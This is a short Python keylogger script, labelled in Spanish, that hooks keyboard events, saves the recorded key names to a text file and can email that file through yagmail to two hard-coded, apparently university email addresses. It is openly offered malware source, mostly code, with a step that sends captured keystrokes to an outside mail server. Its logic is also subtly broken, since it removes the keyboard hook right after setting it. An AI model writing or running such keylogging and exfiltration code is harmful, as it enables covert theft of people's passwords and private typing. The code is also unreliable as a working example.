import keyboard
import smtplib
import yagmail
from os import remove

registros = []

def callback(event):
    #print(event.name) 
    registros.append(event.name) 

def output(text):
    with open('output.txt', 'w') as f:
        f.write(text)

def send_email(sender_email , receiver_email):
  
    yag = yagmail.SMTP(sender_email)
    yag.send(to=receiver_email, subject='Registros de Keylogger', contents='Se adjunta el archivo de registros', attachments='output.txt')

def main():
    print("---------------------------------")
    print("---------- KeyLogger ------------")
    print("---------------------------------")
    
    respuesta_email = input("¿Deseas enviar los registros por email? (yes/no): ")
    respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
        
    if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
    	print("Interrumpiendo la ejecución del programa...")
    	return
    
    keyboard.on_release(callback)
                
    keyboard.unhook_all()
    
    registro = ",".join(registros)
    
    print(registro)
    output(registro)
    
    if respuesta_email.lower() in ['yes', 'y']:
    	receivers = ["janet1204@ciencias.unam.mx", "Paola_VB@ciencias.unam.mx"]
    	send_email("janet1204@ciencias.unam.mx", receivers)
        
    if respuesta_guardar.lower() not in ['yes', 'y']:
        remove('output.txt')


if __name__ == "__main__":
    main()
